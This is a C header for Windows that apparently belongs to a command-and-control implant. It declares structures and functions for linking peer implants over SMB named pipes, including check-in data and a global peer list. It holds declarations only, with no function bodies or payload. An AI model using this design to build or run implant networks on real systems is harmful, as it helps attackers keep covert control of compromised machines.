#ifndef _P2P_H_
#define _P2P_H_

#include <windows.h>

#define PEER_TYPE_SMB 0x01

typedef struct {
    DWORD      ID;
    DWORD      Type;
    VOID*      Context;
    LIST_ENTRY ListEntry;
} PEER_IMPLANT, *PPEER_IMPLANT;

typedef struct {
    HANDLE Pipe;
    CHAR*  Name;
} PEER_SMB_CONTEXT, *PPEER_SMB_CONTEXT;

BOOL PeerConnect( DWORD Type, PVOID* Context, PVOID* Checkin, DWORD* CheckinSize, VOID* Config, DWORD ConfigSize );
BOOL PeerRegister( DWORD Type, DWORD ID, PVOID Context );
BOOL PeerRead( DWORD ID, VOID** Data, DWORD* Size );
BOOL PeerRequest( DWORD ID, VOID* Data, DWORD Size );

BOOL SmbConnect( PEER_SMB_CONTEXT** Context, VOID* Config, DWORD ConfigSize );
BOOL SmbRead( PEER_SMB_CONTEXT* Context, VOID** Data, DWORD* DataSize );
BOOL SmbRequest( PEER_SMB_CONTEXT* Context, VOID* Data, DWORD Size );
BOOL SmbClose( PEER_SMB_CONTEXT* Context );

extern LIST_ENTRY g_PeerList;

#endif // !_P2P_H_
